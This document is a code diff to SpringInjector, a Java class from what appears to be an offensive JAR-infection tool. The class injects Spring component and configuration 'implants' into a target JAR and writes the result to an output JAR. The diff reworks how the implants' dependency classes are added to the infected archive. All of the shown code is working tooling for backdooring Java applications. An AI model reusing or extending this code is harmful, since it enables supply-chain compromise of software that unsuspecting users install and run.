@@ -6,7 +6,6 @@ import javassist.bytecode.annotation.MemberValue;
 
 import java.io.DataInputStream;
 import java.io.IOException;
-import java.nio.ByteBuffer;
 import java.nio.file.Path;
 import java.util.*;
 import java.util.jar.JarEntry;
@@ -17,49 +16,10 @@ import static org.example.injector.Helpers.*;
 public class SpringInjector {
     private final ImplantHandler implantComponentHandler;
     private final ImplantHandler implantSpringConfigHandler;
-    private final Map<String, ByteBuffer> dependencies = new HashMap<>();
 
     public SpringInjector(ImplantHandler implantComponentHandler, ImplantHandler implantSpringConfigHandler) {
         this.implantComponentHandler = implantComponentHandler;
         this.implantSpringConfigHandler = implantSpringConfigHandler;
-    }
-
-    /**
-     * Add a class to be included in the JAR upon infection.
-     * This is good for any dependencies that the implant needs.
-     * Only one class per class name can exist at the same time. The last put class (under the given name) will be used.
-     * The name for the entry will be derived from the ClassFile instance.
-     *
-     * @param classData ClassFile instance
-     * @throws IOException If the ClassFile cannot be serialized
-     */
-    public void includeDependency(ClassFile classData) throws IOException {
-        includeDependency(ByteBuffer.wrap(asByteArray(classData)), classData.getName());
-    }
-
-    /**
-     * Add a class to be included in the JAR upon infection.
-     * Only one class per class name can exist at the same time. The last put class (under the given name) will be used.
-     * This is good for any dependencies that the implant needs.
-     *
-     * @param classData     Raw bytes representing the content of the class file
-     * @param fullClassName The full name of the class, like "com.example.MyLib"
-     */
-    public void includeDependency(byte[] classData, String fullClassName) {
-        includeDependency(ByteBuffer.wrap(classData), fullClassName);
-    }
-
-    /**
-     * Add a class to be included in the JAR upon infection.
-     * Only one class per class name can exist at the same time. The last put class (under the given name) will be used.
-     * This is good for any dependencies that the implant needs.
-     *
-     * @param classData     Raw bytes representing the content of the class file
-     * @param fullClassName The full name of the class, like "com.example.MyLib"
-     */
-    public void includeDependency(ByteBuffer classData, String fullClassName) {
-        String pathInJar = convertToJarEntryPathName(fullClassName);
-        dependencies.put(pathInJar, classData);
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
@@ -139,16 +99,16 @@ public class SpringInjector {
 
         // Add any dependency classes needed for the implant
         if (didInfect) {
-            for (Map.Entry<String, ByteBuffer> dependencyEntry : dependencies.entrySet()) {
+            Map<String, byte[]> allDependencies = new HashMap<>();
+            allDependencies.putAll(implantSpringConfigHandler.getDependencies());
+            allDependencies.putAll(implantComponentHandler.getDependencies());
+            for (Map.Entry<String, byte[]> dependencyEntry : allDependencies.entrySet()) {
                 String fileName = dependencyEntry.getKey();
-                ByteBuffer fileContent = dependencyEntry.getValue();
+                byte[] fileContent = dependencyEntry.getValue();
 
                 JarEntry newJarEntry = new JarEntry(fileName);
-                byte[] bytes = new byte[fileContent.remaining()];
-                fileContent.get(bytes);
-
                 try {
-                    fiddler.addNewEntry(newJarEntry, bytes);
+                    fiddler.addNewEntry(newJarEntry, fileContent);
                 } catch (ZipException e) {
                     System.out.println("[!] Dependency file '" + fileName + "' already exist. Aborting.");
                     didInfect = false;
